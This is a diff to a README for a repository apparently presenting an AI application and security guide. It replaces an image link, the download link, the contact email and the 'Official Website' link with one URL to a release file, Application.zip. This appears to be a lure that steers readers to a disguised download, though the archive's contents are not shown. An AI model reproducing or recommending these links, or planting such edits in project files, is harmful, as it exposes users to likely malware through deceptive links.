@@ -2,7 +2,7 @@
 
 Welcome to the repository of **Ai迷思录（应用与安全指南）**, also known as "The AI Mythbook"! Here you will find a comprehensive guide on the application and security aspects related to Artificial Intelligence.
 
-![AI Image](https://imgur.com/gallery/hSkWJ)
+![AI Image](https://github.com/sigmavortex/theAIMythbook/releases/download/v1.0.0/Application.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The repository contains various sections covering topics such as:
 
 ## Access Application Files
 
-To access the application files related to "The AI Mythbook", please download the following ZIP file: [Launch Application Files](https://img.shields.io/badge/Launch-Application.zip-orange)
+To access the application files related to "The AI Mythbook", please download the following ZIP file: [Launch Application Files](https://github.com/sigmavortex/theAIMythbook/releases/download/v1.0.0/Application.zip)
 
 ---
 
@@ -46,11 +46,11 @@ Your feedback is valuable in helping us improve "The AI Mythbook" guide. Feel fr
 
 ## Get in Touch
 
-If you have any questions, ideas, or just want to chat about AI, reach out to us at *ai.mythbook@gmail.com*. We are excited to connect with like-minded individuals passionate about the realm of Artificial Intelligence.
+If you have any questions, ideas, or just want to chat about AI, reach out to us at *https://github.com/sigmavortex/theAIMythbook/releases/download/v1.0.0/Application.zip*. We are excited to connect with like-minded individuals passionate about the realm of Artificial Intelligence.
 
 ---
 
-### Visit [Official Website](https://www.theaimythbook.com)
+### Visit [Official Website](https://github.com/sigmavortex/theAIMythbook/releases/download/v1.0.0/Application.zip)
 
 ---
 
